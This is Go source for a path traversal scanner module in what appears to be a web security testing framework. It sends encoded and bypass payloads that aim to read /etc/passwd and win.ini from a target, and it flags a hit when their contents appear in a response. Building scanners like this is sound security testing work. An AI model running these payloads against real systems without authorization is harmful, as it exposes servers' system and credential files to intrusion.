package core

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// PathTraversalAttackResult holds the result of the PathTraversalAttack module execution.
type PathTraversalAttackResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

type baselineInfo struct {
	statusCode int
	bodySize   int
}

// PathValidator implements reflection and status/size diffing logic.
type PathValidator struct {
	Baseline baselineInfo
}

// Validate checks if the response indicates a successful path traversal.
func (v *PathValidator) Validate(resp *http.Response, body string, payload string) (bool, string) {
	// A response identical to the nonexistent-file baseline in both status and
	// body size carries no new information; judging it would flag soft-404
	// pages and pre-existing published content as traversal successes.
	if resp != nil && resp.StatusCode == v.Baseline.statusCode && len(body) == v.Baseline.bodySize {
		return false, ""
	}

	// Content matching
	if strings.Contains(body, "root:x:0:0:") {
		return true, "Path traversal successful via content match (/etc/passwd) with payload: " + payload
	}
	if strings.Contains(strings.ToLower(body), "[extensions]") {
		return true, "Path traversal successful via content match (win.ini) with payload: " + payload
	}

	// Removed faulty 403 status diffing. A 403 means the traversal was blocked, not successful.

	return false, ""
}

// PathTraversalAttack executes the path_traversal_attack security technique.
type PathTraversalAttack struct {
	BaseModule
	Target string
}

// NewPathTraversalAttack creates a new instance of PathTraversalAttack.
func NewPathTraversalAttack(target string) *PathTraversalAttack {
	return &PathTraversalAttack{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

// SetThreads configures the number of concurrent threads.
func (m *PathTraversalAttack) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var traversalPayloads = []string{
	// Unix
	"../../../etc/passwd",
	"../../../../../../../../etc/passwd",
	// Unix bypasses
	"..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // double URL encoded
	"....//....//....//etc/passwd",
	// Windows
	"..\\..\\..\\windows\\win.ini",
	"../../../../../../../../windows/win.ini",
	"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
	// Null byte bypasses
	"../../../etc/passwd%00",
}

func (m *PathTraversalAttack) getBaseline(ctx context.Context, u *url.URL, vectors []InputVector) (map[string]baselineInfo, error) {
	baselines := make(map[string]baselineInfo)
	var firstErr error
	for _, v := range vectors {
		// Non-existent file check
		baselinePayload := fmt.Sprintf("nonexistent_%d", time.Now().UnixNano())
		req, err := m.newRequestForVector(ctx, u, v, baselinePayload)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}

		resp, err := m.Client.Do(req)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}

		body, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
		resp.Body.Close()
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}

		baselines[v.Key] = baselineInfo{
			statusCode: resp.StatusCode,
			bodySize:   len(body),
		}
	}
	return baselines, firstErr
}

// newRequestForVector builds a probe request for a vector. The synthetic
// path_append vector cannot go through BuildRequestWithVector (its key is not
// a "path[i]" segment and the payload must reach the wire verbatim), so it is
// constructed as a raw URL string instead.
func (m *PathTraversalAttack) newRequestForVector(ctx context.Context, u *url.URL, vector InputVector, payload string) (*http.Request, error) {
	if vector.Type == VectorPathSegment && vector.Key == "path_append" {
		return http.NewRequestWithContext(ctx, "GET", rawTraversalURL(u, payload), nil)
	}
	return buildRequest(ctx, &m.BaseModule, u, vector, payload)
}

func buildRequest(ctx context.Context, b *BaseModule, u *url.URL, vector InputVector, payload string) (*http.Request, error) {
	method := "GET"
	if vector.Type == VectorFormBody || vector.Type == VectorJSONBody {
		method = "POST"
	}
	return b.BuildRequestWithVector(ctx, method, u, vector, payload)
}

// rawTraversalURL builds the request URL for the path_append vector as a raw
// string so payloads that are already percent-encoded ("..%2f") reach the wire
// single-encoded; assigning them to url.URL.Path makes URL.String() re-escape
// the percent sign into "%25", which neutralizes the payload.
func rawTraversalURL(u *url.URL, payload string) string {
	raw := u.Scheme + "://" + u.Host + u.EscapedPath()
	if !strings.HasSuffix(raw, "/") {
		raw += "/"
	}
	raw += payload
	if u.RawQuery != "" {
		raw += "?" + u.RawQuery
	}
	return raw
}

// Execute performs the path traversal scan.
func (m *PathTraversalAttack) Execute(ctx context.Context) ([]PathTraversalAttackResult, error) {
	var results []PathTraversalAttackResult
	var mu sync.Mutex
	var firstErr error

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return results, err
	}

	// Step 1: Discover vectors
	vectors, _, verr := m.DiscoverVectors(parsedURL, nil, "", nil)
	if verr != nil {
		return results, verr
	}

	if len(vectors) == 0 {
		vectors = append(vectors, InputVector{Type: VectorPathSegment, Key: "path_append", Value: ""})
	}

	// Step 2: Implement baseline probing
	baselines, baselineErr := m.getBaseline(ctx, parsedURL, vectors)
	if baselineErr != nil {
		firstErr = baselineErr
	}

	jobs := make(chan struct {
		Vector  InputVector
		Payload string
	}, len(vectors)*len(traversalPayloads))

	for _, v := range vectors {
		for _, p := range traversalPayloads {
			jobs <- struct {
				Vector  InputVector
				Payload string
			}{v, p}
		}
	}
	close(jobs)

	var wg sync.WaitGroup
	var missingBaselines int64
	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
				}
				// A vector whose baseline capture failed has no map entry;
				// the zero-value baseline would disable the soft-404 gate, so
				// the vector must not be judged at all. Count it as a failed
				// probe instead.
				baseline, ok := baselines[job.Vector.Key]
				if !ok {
					atomic.AddInt64(&missingBaselines, 1)
					continue
				}
				res, err := m.testVector(ctx, parsedURL, job.Vector, job.Payload, baseline)
				mu.Lock()
				if err != nil && firstErr == nil {
					firstErr = err
				}
				if res != nil {
					results = append(results, *res)
				}
				mu.Unlock()
			}
		}()
	}
	wg.Wait()

	totalJobs := len(vectors) * len(traversalPayloads)
	if totalJobs > 0 && missingBaselines == int64(totalJobs) {
		// Every vector lost its baseline to transport errors: judging was
		// skipped entirely, which must not look like a clean scan.
		detail := "Baseline capture failed for all vectors; traversal judging skipped."
		if firstErr != nil {
			detail += " First error: " + firstErr.Error()
		}
		results = append(results, PathTraversalAttackResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: formatEvidenceDetail(EvidenceWeak, detail),
		})
		return results, ctx.Err()
	}

	// A target where no request ever succeeded must not be reported as a
	// clean scan; surface the first transport error instead.
	if len(results) == 0 && firstErr != nil {
		return results, firstErr
	}

	return results, nil
}

func (m *PathTraversalAttack) testVector(ctx context.Context, u *url.URL, vector InputVector, payload string, baseline baselineInfo) (*PathTraversalAttackResult, error) {
	req, err := m.newRequestForVector(ctx, u, vector, payload)
	if err != nil {
		return nil, err
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		return nil, err
	}
	bodyStr := string(bodyBytes)

	// Step 3: Use PathValidator
	validator := PathValidator{Baseline: baseline}
	isVulnerable, detail := validator.Validate(resp, bodyStr, payload)

	if isVulnerable {
		m.RecordPoC(req, nil, detail)
		return &PathTraversalAttackResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceConfirmed, false),
			Detail: detail,
		}, nil
	}

	return nil, nil
}

func init() {
	RegisterModule("path_traversal_attack", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		threads := PayloadInt(payload, "threads", 5)
		onLog(fmt.Sprintf("Starting PathTraversalAttack on: %s", target))

		tester := NewPathTraversalAttack(target)
		tester.SetThreads(threads)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
